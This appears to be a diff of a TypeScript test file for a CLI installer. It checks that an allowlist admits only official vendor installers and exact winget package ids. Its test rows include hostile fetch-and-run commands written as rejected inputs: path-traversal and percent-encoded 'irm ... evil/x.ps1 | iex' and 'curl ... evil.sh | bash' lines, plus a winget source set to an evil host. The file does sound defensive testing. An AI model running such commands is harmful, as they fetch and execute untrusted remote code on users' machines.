@@ -23,7 +23,8 @@ const KIMI: Vendor = {
 
 const MOONSHOT_PS1 = 'irm https://code.kimi.com/kimi-code/install.ps1 | iex';
 const MOONSHOT_SH = 'curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash';
-const FLAGS = '-e --accept-source-agreements --accept-package-agreements';
+// `--source winget` pins the community repository: without it winget searches msstore too, and an id could resolve there.
+const FLAGS = '-e --source winget --accept-source-agreements --accept-package-agreements';
 const repo = (...parts: string[]): string => join(__dirname, '..', '..', '..', ...parts);
 
 /** PowerShell's parse of a command line: its errors, and the text of every command in it, in order. */
@@ -90,9 +91,9 @@ test('⤓ on Windows is ONE press that skips what is there: every tool step is g
 
 test('⤓ on Windows: each failed step STOPS the line, in words that name the tool', () => {
   const { command } = vendorInstall(KIMI, 'win32');
-  const stops = command.match(/if \(\$LASTEXITCODE -ne 0\) \{ throw '[^']+' \}/gu) ?? [];
+  const stops = command.match(/if \(-not \$\? -or \$LASTEXITCODE -ne 0\) \{ throw '[^']+' \}/gu) ?? [];
 
-  assert.equal(stops.length, 3, `each winget step must be followed by a stop on its exit code: ${command}`);
+  assert.equal(stops.length, 3, `each winget step must be followed by a stop on its failure ($? and the exit code): ${command}`);
   assert.deepEqual(stops.map((stop) => /git|ripgrep|fd/iu.exec(stop)?.[0]?.toLowerCase()), ['git', 'ripgrep', 'fd']);
 });
 
@@ -192,6 +193,22 @@ test('officialSourcesAdmitOnlyMoonshotsPath_AndTheThreeWingetIds', () => {
     ['winget install --id BurntSushi.ripgrep.MSVC -e --accept-source-agreements', true],
     ['winget install --id Git.Git -e --accept-source-agreements --accept-package-agreements', true],
     ['winget install --id Evil.Tool -e', false],
+    // minor 2: the community repository, named exactly, and an EXACT match required (a fuzzy id could resolve to another package)
+    ['winget install --id sharkdp.fd -e --source winget', true],
+    ['winget install --id sharkdp.fd --exact --source winget', true],
+    ['winget install --id sharkdp.fd --source winget', false],
+    ['winget install --id sharkdp.fd', false],
+    ['winget install --id sharkdp.fd -e --source msstore', false],
+    ['winget install --id sharkdp.fd -e --source winget --source msstore', false],
+    ['winget install --id sharkdp.fd -e --source', false],
+    ['winget install --id sharkdp.fd -e winget', false],
+    // minor 3: a prefix match is not a path match - a parent segment, plain or percent-encoded in any case, leaves the admitted folder
+    ['irm https://code.kimi.com/kimi-code/../evil/x.ps1 | iex', false],
+    ['irm https://code.kimi.com/kimi-code/%2e%2e/evil/x.ps1 | iex', false],
+    ['irm https://code.kimi.com/kimi-code/%2E%2e/evil/x.ps1 | iex', false],
+    ['irm https://code.kimi.com/kimi-code/.%2E/evil/x.ps1 | iex', false],
+    ['curl -fsSL https://code.kimi.com/kimi-code/../../evil.sh | bash', false],
+    ['curl -fsSL https://mistral.ai/vibe/../evil.sh | bash', false],
     ['winget install --id sharkdp.fd --source https://evil.example', false],
     ['winget install --id sharkdp.fd --source evil', false],
     ['winget install --manifest C:\\x.yaml', false],
@@ -215,4 +232,16 @@ test('the admitted sources are exactly these — Moonshot’s path, never cdn.ki
   ]);
   assert.deepEqual([...OFFICIAL_SOURCES.packages], ['@openai/codex', '@google/gemini-cli', '@anthropic-ai/claude-code', 'mistral-vibe']);
   assert.deepEqual([...OFFICIAL_SOURCES.wingetIds], ['Git.Git', 'BurntSushi.ripgrep.MSVC', 'sharkdp.fd']);
+});
+
+test('the Windows note says the line is Moonshot’s installer, not a command on the row’s CLI path — ⟳ updates the default install', () => {
+  // vendorUpdate takes the platform and the installed version, not the row's path, so a Kimi row with its own CLI path (another folder, a
+  // KIMI_INSTALL_DIR) is not what ⟳ updates: the script installs into %USERPROFILE%\.kimi-code\bin unless told otherwise. Said, not hidden.
+  const own = { ...KIMI, executablePath: 'D:\\tools\\kimi\\kimi.exe' };
+  const { note, command } = vendorUpdate(own, 'win32', '2.1.1');
+
+  assert.match(note, /CLI path/u, 'the note does not warn that ⟳ ignores the row’s CLI path');
+  assert.match(note, /\.kimi-code\\bin/u);
+  assert.ok(!command.includes('D:\\tools'), 'a path must not be put into the command');
+  assert.equal(command, vendorInstall(KIMI, 'win32').command, 'the update is the same line whatever the row’s CLI path');
 });
